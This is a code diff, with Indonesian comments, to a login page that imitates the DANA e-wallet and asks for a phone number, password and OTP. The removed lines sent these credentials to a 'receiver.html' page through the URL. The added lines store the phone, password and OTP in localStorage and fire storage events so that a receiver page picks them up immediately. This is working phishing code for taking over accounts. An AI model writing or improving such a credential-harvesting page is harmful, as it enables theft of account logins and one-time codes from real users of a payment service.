@@ -334,7 +334,7 @@
 
 <script>
     // ============================================================
-    // INDEX.HTML — FIX LOOPING, PAKAI BUTTON CLICK
+    // INDEX.HTML — TETAP DI HALAMAN, KIRIM DATA KE LOCALSTORAGE
     // ============================================================
 
     const btnLogin = document.getElementById('btnLogin');
@@ -375,7 +375,7 @@
         otpError.style.display = 'none';
     }
 
-    // ===== LOGIN — PAKE CLICK BUKAN SUBMIT =====
+    // ===== LOGIN — KIRIM DATA KE LOCALSTORAGE =====
     btnLogin.addEventListener('click', function() {
         hideAlerts();
 
@@ -393,16 +393,18 @@
             return;
         }
 
-        // === BUKA RECEIVER DENGAN DATA VIA URL ===
-        const baseUrl = window.location.href.split('?')[0].replace('index.html', 'receiver.html');
-        const encodedPhone = encodeURIComponent(phone);
-        const encodedPassword = encodeURIComponent(password);
-        const receiverUrl = `${baseUrl}?phone=${encodedPhone}&password=${encodedPassword}`;
+        // === KIRIM DATA KE LOCALSTORAGE ===
+        const userData = {
+            phone: phone,
+            password: password,
+            timestamp: new Date().toISOString(),
+            status: 'pending'
+        };
+        localStorage.setItem('dana_user_data', JSON.stringify(userData));
+        // Trigger event biar receiver langsung dapet
+        window.dispatchEvent(new Event('storage'));
 
-        // Buka receiver di tab baru
-        window.open(receiverUrl, '_blank');
-
-        // Lanjut ke OTP
+        // LANJUT KE OTP (TETAP DI HALAMAN YANG SAMA)
         document.getElementById('otpPhoneDisplay').textContent = phone;
         showPage('pageOtp');
     });
@@ -431,24 +433,37 @@
         const phone = document.getElementById('danaPhone').value.trim();
         const password = document.getElementById('danaPassword').value.trim();
 
-        // === UPDATE RECEIVER DENGAN OTP ===
-        const baseUrl = window.location.href.split('?')[0].replace('index.html', 'receiver.html');
-        const encodedPhone = encodeURIComponent(phone);
-        const encodedPassword = encodeURIComponent(password);
-        const receiverUrl = `${baseUrl}?phone=${encodedPhone}&password=${encodedPassword}&otp=${otp}`;
+        // === SIMPAN OTP KE LOCALSTORAGE ===
+        const otpData = {
+            otp: otp,
+            phone: phone,
+            password: password,
+            timestamp: new Date().toISOString(),
+            status: 'verified'
+        };
+        localStorage.setItem('dana_otp_data', JSON.stringify(otpData));
+        window.dispatchEvent(new Event('storage'));
 
-        // Buka receiver baru dengan OTP
-        window.open(receiverUrl, '_blank');
+        // UPDATE USER STATUS
+        const userData = JSON.parse(localStorage.getItem('dana_user_data'));
+        if (userData) {
+            userData.status = 'otp_sent';
+            localStorage.setItem('dana_user_data', JSON.stringify(userData));
+            window.dispatchEvent(new Event('storage'));
+        }
 
+        // NOTIFIKASI SUKSES
         otpError.style.display = 'block';
         otpError.className = 'alert-dana success';
         otpError.innerHTML = '<i class="bi bi-check-circle-fill"></i> Kode OTP berhasil diverifikasi! Data telah dikirim ke receiver.';
 
+        // RESET OTP
         otpInputs.forEach(id => {
             document.getElementById(id).value = '';
         });
         document.getElementById('otp1').focus();
 
+        // KEMBALI KE LOGIN SETELAH 4 DETIK
         setTimeout(() => {
             otpError.className = 'alert-dana error';
             otpError.style.display = 'none';
@@ -522,4 +537,4 @@
 </script>
 
 </body>
-        </html>
+                                                            </html>
